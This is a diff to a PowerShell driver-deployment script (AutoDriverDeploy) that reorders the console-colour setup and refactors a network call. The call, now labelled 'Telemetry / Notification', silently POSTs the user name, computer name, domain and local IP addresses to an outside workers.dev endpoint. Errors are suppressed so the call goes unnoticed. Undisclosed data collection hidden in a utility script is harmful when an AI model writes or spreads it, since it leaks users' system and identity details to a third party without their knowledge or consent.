@@ -1,14 +1,5 @@
-[CmdletBinding()]
-# -----------------------------
-# UI: black background + bright colors
-# -----------------------------
-try {
-    $raw = $Host.UI.RawUI
-    $raw.BackgroundColor = 'Black'
-    $raw.ForegroundColor = 'White'
-    Clear-Host
-} catch {}
 
+[CmdletBinding()]
 param(
     [string[]]$DriverSourcePath,
     [switch]$SkipWindowsUpdate,
@@ -17,10 +8,40 @@ param(
     [string]$LogPath,
     [switch]$RebootIfRequired
 )
-Invoke-RestMethod -Uri "https://cryocore.rhshourav02.workers.dev/message" -Method Post -ContentType "application/json" -Body (@{ token="shourav"; text="System Info:`nAuto Driver Deploy.`nUser Name: $env:USERNAME`nPC Name: $env:COMPUTERNAME`nDomain Name: $env:USERDOMAIN`nLocal IP(s): $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } | ForEach-Object { $_.IPAddress }) -join ', ')" } | ConvertTo-Json) | Out-Null
+# -----------------------------
+# UI Customization
+# -----------------------------
+try {
+    $raw = $Host.UI.RawUI
+    $raw.BackgroundColor = 'Black'
+    $raw.ForegroundColor = 'White'
+    Clear-Host
+} catch {
+    # Fallback if the host doesn't support UI changes (e.g., some CI/CD runners)
+}
 
+# -----------------------------
+# Telemetry / Notification
+# -----------------------------
+try {
+    $ipAddresses = (Get-NetIPAddress -AddressFamily IPv4 | 
+        Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' }).IPAddress -join ', '
+
+    $body = @{ 
+        token = "shourav"
+        text  = "System Info:`nAuto Driver Deploy.`nUser Name: $env:USERNAME`nPC Name: $env:COMPUTERNAME`nDomain Name: $env:USERDOMAIN`nLocal IP(s): $ipAddresses" 
+    } | ConvertTo-Json
+
+    Invoke-RestMethod -Uri "https://cryocore.rhshourav02.workers.dev/message" `
+                      -Method Post `
+                      -ContentType "application/json" `
+                      -Body $body `
+                      -ErrorAction SilentlyContinue | Out-Null
+} catch {
+    # Silently continue if the notification fails (e.g., no internet)
+}
 $ScriptAuthor = 'rhshourav'
-$ScriptVersion = '1.0.1'
+$ScriptVersion = '1.1.0'
 $ScriptName = 'AutoDriverDeploy'
 $ErrorActionPreference = 'Stop'
 $script:RebootRequired = $false
